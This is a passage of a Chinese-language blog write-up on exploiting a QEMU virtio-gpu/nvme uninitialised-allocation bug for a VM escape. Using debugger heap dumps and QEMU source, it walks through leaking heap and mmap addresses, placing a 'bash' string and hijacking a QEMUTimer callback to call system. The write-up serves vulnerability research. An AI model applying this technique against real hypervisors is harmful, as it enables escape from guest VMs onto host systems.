+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x7fffa1d43040</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x7fffa1d43030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000291</span></span><br><span class="line"><span class="number">0x7fffa1d43040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00005555567f5010</span></span><br><span class="line"><span class="number">0x7fffa1d43050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffa1d43060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffa1d43070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffa1d43080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffa1d43090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffa1d430a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffa1d430b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffa1d430c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+<p>可见在<code>0x7fffa1d43048</code>处是<code>tcache bin entry</code>，我们便可以根据这个地址泄露出<code>heap</code>的基地址。但光只有这一个地址是远远不够的。</p>
+<p>往后，我们可以把这一块<code>mmap</code>映射的堆块用作<code>nvme</code>申请的<code>NvmeRequest</code>堆块，并且再执行完链表初始化后，也就是这一块函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nvme_init_sq</span><span class="params">(NvmeSQueue *sq, NvmeCtrl *n, <span class="keyword">uint64_t</span> dma_addr,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint16_t</span> sqid, <span class="keyword">uint16_t</span> cqid, <span class="keyword">uint16_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    NvmeCQueue *cq;</span><br><span class="line"></span><br><span class="line">    sq-&gt;io_req = g_new(NvmeRequest, sq-&gt;size);</span><br><span class="line"></span><br><span class="line">    QTAILQ_INIT(&amp;sq-&gt;req_list);</span><br><span class="line">    QTAILQ_INIT(&amp;sq-&gt;out_req_list);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sq-&gt;size; i++) &#123;</span><br><span class="line">        sq-&gt;io_req[i].sq = sq;</span><br><span class="line">        QTAILQ_INSERT_TAIL(&amp;(sq-&gt;req_list), &amp;sq-&gt;io_req[i], entry); <span class="comment">//插入链表</span></span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再来看此刻的堆块：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">30</span>xg <span class="number">0x7fffa1d43040</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x7fffa1d43030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000291</span></span><br><span class="line"><span class="number">0x7fffa1d43040</span>:	<span class="number">0x0000555557095f00</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffa1d43050</span>:	<span class="number">0x0000000139f43000</span>	<span class="number">0x0000000068736162</span></span><br><span class="line"><span class="number">0x7fffa1d43060</span>:	<span class="number">0x0000000139f43000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d43070</span>:	<span class="number">0x0000000139f43000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d43080</span>:	<span class="number">0x0000000139f43000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d43090</span>:	<span class="number">0x0000000139f43050</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffa1d430a0</span>:	<span class="number">0x0000000139f43000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d430b0</span>:	<span class="number">0x0000000139f43000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d430c0</span>:	<span class="number">0x0000000139f43000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d430d0</span>:	<span class="number">0x00007fffa1d430e0</span> -&gt;链表地址	<span class="number">0x0000555557095f30</span></span><br><span class="line"><span class="number">0x7fffa1d430e0</span>:	<span class="number">0x0000555557095f00</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d430f0</span>:	<span class="number">0x0000000139f43000</span>	<span class="number">0x0000000000000100</span></span><br></pre></td></tr></table></figure>
+<p>可以看到在<code>0x7fffa1d430d0</code>地址处就有着稳定的<code>mmap</code>映射地址，从而我们还可以泄露得到<code>QEMU</code>将我们<code>guest</code>空间映射后的内存空间地址。</p>
+<p>可是还是不够，我们还需要泄露程序的基地址，这一部分后续连着和控制执行流一起说。</p>
+<h3 id="0x43-System-Bash"><a href="#0x43-System-Bash" class="headerlink" title="0x43 System Bash"></a>0x43 System Bash</h3><p>在说控制流之前我们先说<code>shell</code>写入过程，在最终取得的<code>system(&quot;/bin/bash&quot;)</code>之前，我们还必须得知字符串<code>/bin/bash</code>的地址。这里其实有很多方法，比如在<code>ELF</code>程序中搜索相关的字符串根据相对基地址的偏移计算出来，比如在堆中搜索，又比如<code>libc</code>搜索，更离谱的话可以<code>one_gadget</code>省去字符串的麻烦…</p>
+<p>但是做利用必然是为了追求稳定和可变性。由我们自己写<code>shell</code>并且还能知道我们写入的地址，那么这才是最稳定的。</p>
+<p>我这里因为没有找到很好的方法写<code>shell</code>，也是偷懒，只达到了写四字节<code>shell</code>的目的。总的来说好像确实够用了（写个<code>“bash”</code>就行），希望读者能够找出更好的写多字节<code>shell</code>的方法。</p>
+<p>回到之前第一次<code>free</code>的状态，也就是堆布局如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tcachebins</span><br><span class="line"><span class="number">0x280</span> [  <span class="number">1</span>]: <span class="number">0x555557570210</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x290</span> [  <span class="number">1</span>]: <span class="number">0x7fffa1d43040</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>我们再次进入到<code>virtio-gpu</code>的伪造堆块过程当中：</p>
+<p>此时<code>ents</code>申请到了<code>0x7ff</code>的<code>mmap</code>堆块：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p ents</span><br><span class="line">$<span class="number">2</span> = (struct virtio_gpu_mem_entry *) <span class="number">0x7fffa1d1e040</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x7fffa1d1e040</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x7fffa1d1e030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000291</span></span><br><span class="line"><span class="number">0x7fffa1d1e040</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d1e050</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000068736162</span> <span class="comment">//在ents-&gt;length字段写入shell</span></span><br><span class="line"><span class="number">0x7fffa1d1e060</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d1e070</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d1e080</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d1e090</span>:	<span class="number">0x0000000139f1e050</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffa1d1e0a0</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d1e0b0</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d1e0c0</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br></pre></td></tr></table></figure>
+<p>在地址<code>0x7fffa1d1e058</code>处的<code>length</code>字段写入<code>shell</code>字符串（此处为<code>&quot;bash&quot;</code>），不能在<code>0x7fffa1d1e040</code>，也就是<code>ents[0]</code>处写入，因为后续该堆块被释放后内容会被覆盖。</p>
+<p>随后经过<code>iov</code>申请堆块、释放。最终<code>tcache bin</code>布局如下所示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tcachebins</span><br><span class="line"><span class="number">0x290</span> [  <span class="number">2</span>]: <span class="number">0x7fffa1d1e040</span> —▸ <span class="number">0x555557973eb0</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>堆块内容如下所示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x7fffa1d1e040</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x7fffa1d1e030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000291</span></span><br><span class="line"><span class="number">0x7fffa1d1e040</span>:	<span class="number">0x0000555557973eb0</span> -&gt;next chunk	<span class="number">0x00005555567f5010</span></span><br><span class="line"><span class="number">0x7fffa1d1e050</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000068736162</span></span><br><span class="line"><span class="number">0x7fffa1d1e060</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d1e070</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d1e080</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d1e090</span>:	<span class="number">0x0000000139f1e050</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffa1d1e0a0</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d1e0b0</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x7fffa1d1e0c0</span>:	<span class="number">0x0000000139f1e000</span>	<span class="number">0x0000000000000100</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x0000555557973eb0</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555557973ea0</span>:	<span class="number">0x0000555557973e30</span>	<span class="number">0x0000000000000291</span></span><br><span class="line"><span class="number">0x555557973eb0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00005555567f5010</span></span><br><span class="line"><span class="number">0x555557973ec0</span>:	<span class="number">0x00007fffa1d1e000</span>	<span class="number">0x0000000068736162</span> <span class="comment">// shell字段</span></span><br><span class="line"><span class="number">0x555557973ed0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555557973ee0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555557973ef0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555557973f00</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555557973f10</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555557973f20</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555557973f30</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+<p>在地址<code>0x7fffa1d1e040</code>处存放着下个堆块的地址，而下个堆块在地址<code>0x555557973ec8</code>又存放着<code>shell</code>字符串，因此，我们便能够得到写入任意<code>shell</code>字符串的地址。</p>
+<p><strong>在这里我还想提一嘴的是：有的读者可能看到这个小标题开头部分就会问，你这不是多此一举么？既然我们能够读写<code>mmap</code>的映射区域，为什么不把<code>shell</code>写在这块区域呢？而且前面也已经泄露得到了<code>mmap</code>映射区域的地址。</strong></p>
+<p>我想说的是，没错。有了<code>mmap</code>映射区域的地址确实可以随心所欲的写<code>shell</code>，而不用像我前面提到的这个方法这么麻烦。</p>
+<p>但是，我经过调试，<strong>在最终<code>QEMU</code>中执行控制流到<code>system(&quot;shell&quot;)</code>后，<code>shell</code>字符串地址为<code>0x7ff</code>的<code>mmap</code>映射区域，最终会新开一个线程，在新线程当中，并没有<code>0x7f</code>的<code>mmap</code>映射地址。也就是传入的字符串参数<code>not access</code>，最终控制会失败。</strong>所以这也是为什么我花这么绕的力气来控制<code>shell</code>。</p>
+<p>可以看一下我的调试过程。进入<code>system</code>调用初始：</p>
+<p><img src="/QEMU-ErrorHandling分析/system初始.png" alt="system初始"></p>
+<p>可以看到此时是存在<code>ls</code>字符串的空间的。</p>
+<p>往后在执行<code>SYS_clone</code>前：</p>
+<p><img src="/QEMU-ErrorHandling分析/clone前.png" alt="clone前"></p>
+<p>此时的<code>shell</code>地址还是存在的，<code>SYS_clone</code>后：</p>
+<p><img src="/QEMU-ErrorHandling分析/clone后.png" alt="clone后"></p>
+<p>此时在另一个线程中已经不存在这个区域的<code>memory</code>了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap <span class="number">0x7f2dd9d1c300</span></span><br><span class="line">There are no mappings <span class="keyword">for</span> specified address <span class="keyword">or</span> <span class="keyword">module</span>.</span><br></pre></td></tr></table></figure>
+<p>具体原因我也没有追溯，就留给读者自行调试解决了。</p>
+<h3 id="0x44-Control-PC"><a href="#0x44-Control-PC" class="headerlink" title="0x44 Control PC"></a>0x44 Control PC</h3><p>最终要我们需要控制程序的执行流是需要控制<code>RIP</code>。回溯一下先前我们阅读的<code>nvme_init_sq()</code>这个函数代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nvme_init_sq</span><span class="params">(NvmeSQueue *sq, NvmeCtrl *n, <span class="keyword">uint64_t</span> dma_addr,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint16_t</span> sqid, <span class="keyword">uint16_t</span> cqid, <span class="keyword">uint16_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">		<span class="comment">//......</span></span><br><span class="line">    QTAILQ_INIT(&amp;sq-&gt;req_list);</span><br><span class="line">    QTAILQ_INIT(&amp;sq-&gt;out_req_list);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sq-&gt;size; i++) &#123;</span><br><span class="line">        sq-&gt;io_req[i].sq = sq;</span><br><span class="line">        QTAILQ_INSERT_TAIL(&amp;(sq-&gt;req_list), &amp;sq-&gt;io_req[i], entry);</span><br><span class="line">    &#125;</span><br><span class="line">    sq-&gt;timer = timer_new_ns(QEMU_CLOCK_VIRTUAL, nvme_process_sq, sq); <span class="comment">//初始化timer</span></span><br><span class="line"></span><br><span class="line">    assert(n-&gt;cq[cqid]);</span><br><span class="line">    cq = n-&gt;cq[cqid];</span><br><span class="line">    QTAILQ_INSERT_TAIL(&amp;(cq-&gt;sq_list), sq, entry);</span><br><span class="line">    n-&gt;sq[sqid] = sq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span> &#123;</span></span><br><span class="line">    <span class="keyword">int64_t</span> expire_time;        <span class="comment">/* in nanoseconds */</span></span><br><span class="line">    QEMUTimerList *timer_list;</span><br><span class="line">    QEMUTimerCB *cb;</span><br><span class="line">    <span class="keyword">void</span> *opaque;</span><br><span class="line">    QEMUTimer *next;</span><br><span class="line">    <span class="keyword">int</span> attributes;</span><br><span class="line">    <span class="keyword">int</span> scale;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>立马就能联想到<code>QEMU</code>中常见的利用<code>QEMUTimer.cb(QEMUTimer.opaque)</code>劫持控制流的操作。在<code>nvme_init_sq()</code>中需要申请<code>0x40</code>（包含<code>head</code>）大小的<code>timer</code>结构体，因此，这里我们就可以像先前一样来伪造一个<code>timer</code>的堆块，使得该函数申请的时候能够正好申请到我们伪造的堆块中，从而达到控制<code>timer</code>结构的目的。</p>
+<p>首先我们需要像先前一样，将<code>mmap</code>映射区域的<code>0x40 size</code>的伪造堆块释放进<code>tcache bin</code>中。（这里其实还应当观察一下堆块布局，必要的时候需要利用堆风水稳定堆布局），释放之前堆布局如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tcachebins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x40</span> [  <span class="number">7</span>]: <span class="number">0x563317b78f60</span> —▸ <span class="number">0x563317a6d190</span> —▸ <span class="number">0x563317929050</span> —▸ <span class="number">0x563317a6c850</span> —▸ <span class="number">0x563317a17f90</span> —▸ <span class="number">0x5633179286a0</span> —▸ <span class="number">0x563317925a30</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span> [  <span class="number">6</span>]: <span class="number">0x56331763b340</span> —▸ <span class="number">0x563316e8bc00</span> —▸ <span class="number">0x563316e7e040</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p><code>tcache bin</code>中<code>0x40</code>大小的<code>size</code>已经填满了（尝试了很多次基本都是满的，就不堆风水了）。因此后续释放的时候会进入<code>fastbin</code>中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x7fea15d1f030</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>执行完<code>timer_new_ns()</code>后：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p sq.timer</span><br><span class="line">$<span class="number">1</span> = (QEMUTimer *) <span class="number">0x7fea15d1f040</span></span><br><span class="line">pwndbg&gt; p *sq.timer</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  expire_time = <span class="number">-1</span>,</span><br><span class="line">  timer_list = <span class="number">0x563316e20880</span>,</span><br><span class="line">  cb = <span class="number">0x56331552a879</span> &lt;nvme_process_sq&gt;,</span><br><span class="line">  opaque = <span class="number">0x563317e70c20</span>,</span><br><span class="line">  next = <span class="number">0x0</span>,</span><br><span class="line">  attributes = <span class="number">0</span>,</span><br><span class="line">  scale = <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>成功把伪造堆块分配给<code>timer</code>。由于此时<code>timer-&gt;cb</code>是函数<code>nvme_process_sq()</code>，因此我们就能够泄露得到程序的基地址，从而得到<code>system</code>的函数地址。</p>
+<p>这时候就随意更改<code>cb</code>和<code>opaque</code>了。最终实现控制<code>RIP</code>。</p>
+<p>控制后的<code>timer</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *sq.timer</span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  expire_time = <span class="number">-1</span>,</span><br><span class="line">  timer_list = <span class="number">0x563316e20880</span>,</span><br><span class="line">  cb = <span class="number">0x5633152d7ef0</span> &lt;system@plt&gt;,</span><br><span class="line">  opaque = <span class="number">0x563317e6cec8</span>,</span><br><span class="line">  next = <span class="number">0x0</span>,</span><br><span class="line">  attributes = <span class="number">0</span>,</span><br><span class="line">  scale = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x/<span class="number">1</span>s <span class="number">0x563317e6cec8</span></span><br><span class="line"><span class="number">0x563317e6cec8</span>: <span class="string">"bash"</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x05-Summary"><a href="#0x05-Summary" class="headerlink" title="0x05 Summary"></a>0x05 Summary</h2><p>其实利用不难，主要在一些细节部分需要特别注意一下。以及在堆块的构造、分配、释放等等也需要仔细一些。如果对堆的申请与释放比较熟悉的话就很容易上手了。</p>
+<p>将未初始化分配转化成<code>UAF</code>其实是比较巧妙的，以往在<code>QEMU</code>中出现的<code>UAF</code>漏洞几乎都是不可利用的，有了这个议题提出的全新的利用方法，对后续<code>QEMU</code>的漏洞利用来说也是增加了一些技巧的。</p>
+<p>但是比较可惜的是议题作者并没有分享他们自身是如何<code>fuzz</code>出这个漏洞的，只是简单的一笔带过，比较遗憾。</p>
+<h2 id="0x06-Some-Tricks"><a href="#0x06-Some-Tricks" class="headerlink" title="0x06 Some Tricks"></a>0x06 Some Tricks</h2><ol>
+<li>我经过反复调试后得出的结论：<code>QEMU</code>中<code>g_new()</code>和<code>g_malloc()</code>优先从<code>tcache bin</code>中取堆块，<code>g_malloc0()</code>优先不从<code>tcache bin</code>中取堆块，具体原因待细究。（这部分会影响写利用）</li>
+<li>尽量不用<code>gdb ./qemu-system-x86_64 -q</code>调试，用<code>gdb attach</code>调试比较好，前者的堆块布局和真实的堆块布局有区别。</li>
+<li>在<code>GPU</code>创建<code>res</code>的时候（也就是<code>virtio_gpu_resource_create_2d</code>函数），其中的<code>pixman_image_create_bits()</code>函数会有一个<code>malloc</code>的过程，<code>size</code>为<code>0x110</code>（包含<code>head</code>），调试利用的时候会有影响。<code>nvme_map_prp</code>中的<code>qemu_iovec_init()</code>也同样。</li>
+</ol>
+<h2 id="0x08-Reference"><a href="#0x08-Reference" class="headerlink" title="0x08 Reference"></a>0x08 Reference</h2><ol>
+<li><a href="https://blackhat.app.swapcard.com/event/black-hat-asia-2021/planning/UGxhbm5pbmdfMzU3MDI0" target="_blank" rel="noopener">https://blackhat.app.swapcard.com/event/black-hat-asia-2021/planning/UGxhbm5pbmdfMzU3MDI0</a></li>
+<li><a href="https://github.com/hustdebug/scavenger" target="_blank" rel="noopener">https://github.com/hustdebug/scavenger</a></li>
+</ol>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2021/04/15/QEMU-QTest && Libfuzzer源码分析（下）/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2021/06/21/QEMU源码分析/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
